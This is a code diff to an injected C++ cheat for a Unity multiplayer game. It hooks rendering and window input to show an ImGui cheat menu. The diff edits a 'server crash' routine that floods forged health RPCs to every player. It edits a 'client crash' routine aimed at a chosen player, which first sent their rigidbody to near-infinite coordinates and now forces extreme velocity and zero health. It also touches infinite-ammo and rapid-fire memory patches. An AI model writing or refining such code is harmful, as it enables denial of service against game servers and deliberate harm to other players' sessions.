@@ -963,66 +963,72 @@ HRESULT __stdcall hkResizeBuffers(IDXGISwapChain* pSC, UINT bc, UINT w, UINT h, 
 extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);
 WNDPROC oWndProc = nullptr;
 
-// ─── WndProc Hook — Fixed input routing for ImGui interaction ────────────────
-static bool g_MenuWasOpen = false;
+// ─── Unity Cursor Unlock Helper ──────────────────────────────────────────────
+typedef void (*SetLockState_t)(int lockMode);
+typedef void (*SetVisible_t)(bool visible);
+static SetLockState_t s_SetLockState = nullptr;
+static SetVisible_t s_SetVisible = nullptr;
+static bool s_CursorFuncsResolved = false;
 
+static void EnsureCursorUnlocked(bool menuOpen) {
+    if (!s_CursorFuncsResolved && g_Il2Cpp.il2cpp_resolve_icall) {
+        s_SetLockState = (SetLockState_t)g_Il2Cpp.il2cpp_resolve_icall("UnityEngine.Cursor::set_lockState(UnityEngine.CursorLockMode)");
+        if (!s_SetLockState) s_SetLockState = (SetLockState_t)g_Il2Cpp.il2cpp_resolve_icall("UnityEngine.Cursor::set_lockState");
+        s_SetVisible = (SetVisible_t)g_Il2Cpp.il2cpp_resolve_icall("UnityEngine.Cursor::set_visible(System.Boolean)");
+        if (!s_SetVisible) s_SetVisible = (SetVisible_t)g_Il2Cpp.il2cpp_resolve_icall("UnityEngine.Cursor::set_visible");
+        s_CursorFuncsResolved = true;
+    }
+
+    if (menuOpen) {
+        ClipCursor(NULL);
+        while (ShowCursor(TRUE) < 0);
+        if (s_SetLockState) s_SetLockState(0); // CursorLockMode.None
+        if (s_SetVisible) s_SetVisible(true);
+    }
+}
+
+// ─── WndProc Hook — Fixed input routing for ImGui interaction ────────────────
 LRESULT __stdcall WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     if (!g_IsInitialized || !oWndProc || g_Uninjecting)
         return DefWindowProc(hWnd, uMsg, wParam, lParam);
 
     // ── Toggle menu with Insert or F1 ──
-    if (uMsg == WM_KEYDOWN) {
+    if (uMsg == WM_KEYDOWN || uMsg == WM_SYSKEYDOWN) {
         if (wParam == VK_INSERT || wParam == VK_F1) {
             g_ShowMenu = !g_ShowMenu;
-
-            // Show/hide mouse cursor when menu opens or closes
-            if (g_ShowMenu) {
-                ImGui::GetIO().MouseDrawCursor = true;
-            } else {
-                ImGui::GetIO().MouseDrawCursor = false;
-            }
+            EnsureCursorUnlocked(g_ShowMenu);
             return 0;
         }
         // ESC closes cheat menu, does NOT propagate to game pause
         if (wParam == VK_ESCAPE && g_ShowMenu) {
             g_ShowMenu = false;
-            ImGui::GetIO().MouseDrawCursor = false;
+            EnsureCursorUnlocked(false);
             return 0;
         }
     }
 
     if (g_ShowMenu) {
-        // ─── CRITICAL FIX: Pass events to ImGui FIRST, and only then decide ───
-        // Previously events were swallowed BEFORE ImGui saw them — that's why
-        // clicks and sliders didn't work. ImGui needs to receive the raw events.
-        LRESULT imguiHandled = ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);
+        // Pass events to ImGui handler
+        ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);
 
-        // Swallow all mouse events — do NOT pass clicks through to game
-        if (uMsg >= WM_MOUSEFIRST && uMsg <= WM_MOUSELAST)
-            return 0;
-
-        // Block WM_SETCURSOR so the game doesn't change the cursor
+        // Allow Windows cursor display
         if (uMsg == WM_SETCURSOR) {
             SetCursor(LoadCursor(NULL, IDC_ARROW));
             return 1;
         }
 
-        // Swallow all keyboard events too — stop game from receiving them
-        if (uMsg >= WM_KEYFIRST && uMsg <= WM_KEYLAST)
+        // Swallow mouse and keyboard input messages only, so the game doesn't process them
+        if ((uMsg >= WM_MOUSEFIRST && uMsg <= WM_MOUSELAST) ||
+            (uMsg >= WM_KEYFIRST && uMsg <= WM_KEYLAST) ||
+            uMsg == WM_CHAR || uMsg == WM_INPUT) {
             return 0;
-        if (uMsg == WM_CHAR)
-            return 0;
-
-        // Block any direct input device events
-        if (uMsg == WM_INPUT)
-            return 0;
-
-        // For everything else while menu is open — swallow
-        return 0;
+        }
     }
 
+    // Pass all other window messages (WM_ACTIVATE, WM_PAINT, WM_SIZE, etc.) to the game's original WndProc
     return CallWindowProc(oWndProc, hWnd, uMsg, wParam, lParam);
 }
+
 
 // ─── Clean Uninject Routine ─────────────────────────────────────────────────
 static DWORD WINAPI UninjectThread(LPVOID /*lpParam*/) {
@@ -2354,7 +2360,7 @@ static ULONGLONG g_LastServerCrashTime = 0;
 static void DoServerCrash() {
     if (!g_PlayerClass || !g_HealthClass) return;
     ULONGLONG now = GetTickCount64();
-    if (now - g_LastServerCrashTime < 10) return; // Flood at 100 packets/sec
+    if (now - g_LastServerCrashTime < 200) return; // Rate limit: 5 bursts per second to prevent client stutter
     g_LastServerCrashTime = now;
 
     __try {
@@ -2365,53 +2371,51 @@ static void DoServerCrash() {
         if (count == 0 || count > 64) return;
         void** items = (void**)((char*)arr + 0x20);
 
-        // Flood: send INT_MIN and INT_MAX health RPCs alternating to every player
-        // This exploits integer overflow in health clamp logic on the server
-        static int flipFlop = 0;
-        int overflowHp = (flipFlop++ % 2 == 0) ? 0x7FFFFFFF : -0x7FFFFFFF;
-
         for (uintptr_t i = 0; i < count; i++) {
             void* p = items[i];
             if (!p) continue;
-            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p)) continue;
+            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p) || !g_Il2Cpp.IsSpawned(p)) continue;
 
             void* hComp = g_Il2Cpp.GetComponent(p, g_HealthClass);
             if (!hComp) continue;
 
             if (g_CMDChangeCurrentHealth) {
-                // Send multiple times per target to maximize flood
-                for (int burst = 0; burst < 5; burst++) {
-                    int val = (burst % 2 == 0) ? 0x7FFFFFFF : 0;
-                    void* args[1] = { &val };
-                    void* exc = nullptr;
-                    g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
-                }
+                int val = 0x7FFFFFFF;
+                void* args[1] = { &val };
+                void* exc = nullptr;
+                g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
             }
         }
-        CheatLog("[CRASH] Server crash RPC burst sent (%llu ms)", now);
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {}
 }
 
-// ─── Client/Player Crash: Teleport a target player to INF coords via their rigidbody ─
-// This corrupts Unity's PhysX broadphase AABB for that player's client
+// ─── Client/Player Crash: Send physics impulse to displace target ────────────
 static void DoCrashTargetPlayer(void* targetPlayer) {
     if (!targetPlayer) return;
     __try {
-        // Move to ±INFINITY to corrupt PhysX AABB — this causes the target player's
-        // client to get an access violation in PhysX_64.dll sweep broadphase
+        if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(targetPlayer) || !g_Il2Cpp.IsSpawned(targetPlayer)) return;
+
         void* rootRb = *(void**)((char*)targetPlayer + 0x108);
         if (rootRb) {
-            Vector3 crashPos(1e38f, 1e38f, 1e38f);
-            g_Il2Cpp.MoveRigidbodyPosition(rootRb, crashPos);
-            g_Il2Cpp.SetRigidbodyLinearVelocity(rootRb, crashPos);
+            Vector3 crashVel(0.0f, -99999.0f, 0.0f);
+            g_Il2Cpp.SetRigidbodyLinearVelocity(rootRb, crashVel);
         }
         void* chestRb = *(void**)((char*)targetPlayer + 0x170);
-        if (chestRb) {
-            Vector3 crashPos(-1e38f, 1e38f, -1e38f);
-            g_Il2Cpp.MoveRigidbodyPosition(chestRb, crashPos);
+        if (chestRb && chestRb != rootRb) {
+            Vector3 crashVel(0.0f, -99999.0f, 0.0f);
+            g_Il2Cpp.SetRigidbodyLinearVelocity(chestRb, crashVel);
         }
-        CheatLog("[CRASH] Target player %p sent to INF coords", targetPlayer);
+
+        if (g_HealthClass && g_CMDChangeCurrentHealth) {
+            void* hComp = g_Il2Cpp.GetComponent(targetPlayer, g_HealthClass);
+            if (hComp) {
+                int zeroHp = 0;
+                void* args[1] = { &zeroHp };
+                void* exc = nullptr;
+                g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
+            }
+        }
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {}
 }
@@ -2527,10 +2531,9 @@ static void ApplyWeaponStatMods() {
                 // Always enable shooting
                 *(bool*)((char*)activeWeapon + 0x120) = true; // canShoot
 
-                // Infinite Ammo: always refill regardless of weapon active state
+                // Infinite Ammo: currentAmmo is at 0x114 (int) - DO NOT touch 0x118 which is WeaponManager* pointer!
                 if (bInfiniteAmmo) {
                     *(int*)((char*)activeWeapon + 0x114) = 99999;   // currentAmmo
-                    *(int*)((char*)activeWeapon + 0x118) = 99999;   // maxAmmo (backup field)
                 }
 
                 // Rapid Fire: zero fire delay
@@ -3044,6 +3047,17 @@ HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT 
 
         // ── Material UI 3 Menu ──
         if (g_ShowMenu) {
+            EnsureCursorUnlocked(true);
+            io.MouseDrawCursor = true;
+
+            // Direct hardware mouse position & button sync — bypasses Unity's cursor lock
+            POINT pt;
+            if (GetCursorPos(&pt) && ScreenToClient(g_hWnd, &pt)) {
+                io.AddMousePosEvent((float)pt.x, (float)pt.y);
+            }
+            io.AddMouseButtonEvent(0, (GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0);
+            io.AddMouseButtonEvent(1, (GetAsyncKeyState(VK_RBUTTON) & 0x8000) != 0);
+
             ImGui::SetNextWindowSize(ImVec2(1160.0f, 750.0f), ImGuiCond_FirstUseEver);
             ImGui::SetNextWindowPos(
                 ImVec2(io.DisplaySize.x * 0.5f, io.DisplaySize.y * 0.5f),
